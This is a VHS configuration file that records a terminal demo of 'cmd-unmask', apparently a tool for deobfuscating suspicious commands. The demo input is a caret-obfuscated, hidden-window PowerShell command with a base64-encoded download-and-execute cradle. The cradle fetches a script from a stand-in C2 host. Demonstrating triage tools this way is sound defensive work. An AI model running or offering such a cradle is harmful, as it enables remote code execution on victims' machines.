# VHS tape configuration for cmd-unmask terminal recording
# Requires: https://github.com/charmbracelet/vhs

Output docs/demo.gif

Set Shell "bash"
Set FontSize 14
Set Width 1200
Set Height 700
Set Padding 20
Set Theme "Catppuccin Mocha"

# Type and execute the single-command triage demo
Type "cmd-unmask -c \"p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==\""
Sleep 500ms
Enter

# Pause to allow terminal output to be read
Sleep 6s
